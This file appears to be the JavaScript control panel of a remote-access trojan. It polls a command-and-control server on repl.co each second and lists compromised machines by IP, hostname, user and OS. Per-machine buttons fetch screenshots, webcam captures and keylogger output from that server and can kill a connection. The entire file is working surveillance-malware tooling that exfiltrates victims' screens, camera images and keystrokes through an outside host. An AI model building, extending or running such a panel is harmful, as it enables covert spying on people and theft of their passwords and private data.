let SOCKETS_N = 0

function display() {
  let sockets = JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets'))
  SOCKETS_N = sockets.length
  document.querySelector(`#sockets`).innerHTML  = ""

  for(let socket of sockets) {
    document.querySelector(`#sockets`).innerHTML += `<div class="socket">
      <span>${socket.id}</span>
      <span>${socket.ip}</span>
      <span>${socket.host}</span>
      <span>${socket.name}</span>
      <span>${socket.os}</span>
      <ion-icon name="desktop-outline" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
      <ion-icon name="camera-outline" onclick="image('${socket.id}', 'webcam')"></ion-icon>
      <ion-icon name="receipt-outline" onclick="text('${socket.id}', 'keylog')"></ion-icon>
      <ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>
    </div>`
  }
}

setInterval(() => {
  display()
}, 1000)

function image(id, method) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
  let img = JSON.parse(get(url)).base64 || "url(assets/404.png)"
  document.querySelector('#render').innerHTML = `<img id='render-img' src='${img}'>`
}

function text(id, method) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
  let res = JSON.parse(get(url)).rawtext || "No text found"
  document.querySelector('#render').innerHTML = `<p class="render-text">${res}</p>`
}

function kill(id) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/kill/${id}`
  get(url)
  alert('correctly killed')
}